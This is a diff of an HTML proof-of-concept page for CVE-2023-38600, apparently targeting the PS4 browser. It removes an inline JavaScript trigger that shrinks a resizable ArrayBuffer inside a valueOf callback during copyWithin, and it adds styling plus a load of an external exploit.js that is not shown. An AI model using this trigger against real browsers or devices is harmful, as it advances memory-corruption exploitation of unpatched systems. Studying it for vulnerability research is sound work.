@@ -2,36 +2,15 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CVE-2023-38600 Fixed PoC</title>
+  <title>PS4 CVE-2023-38600 Exploit Test</title>
+  <style>
+    body { font-family: monospace; background: black; color: lime; padding: 10px; }
+    pre { white-space: pre-wrap; word-break: break-word; }
+  </style>
 </head>
 <body>
-  <pre id="log"></pre>
-  <script>
-    let ab; // declare in global scope
-
-    function log(msg) {
-      const el = document.getElementById("log");
-      el.textContent += msg + "\n";
-      console.log(msg);
-    }
-
-    try {
-      ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
-      const u8 = new Uint8Array(ab);
-      
-      function call_back() {
-        log("[+] Inside valueOf(): resizing buffer");
-        ab.resize(0);
-        return 0;
-      }
-
-      log("[*] Triggering copyWithin()");
-      u8.copyWithin(0x20, { valueOf: call_back });
-
-      log("[*] copyWithin() completed");
-    } catch (e) {
-      log("[!] Exception: " + e);
-    }
-  </script>
+  <h1>PS4 CVE-2023-38600 PoC</h1>
+  <pre id="log">[+] PoC starting...\n</pre>
+  <script src="exploit.js"></script>
 </body>
 </html>
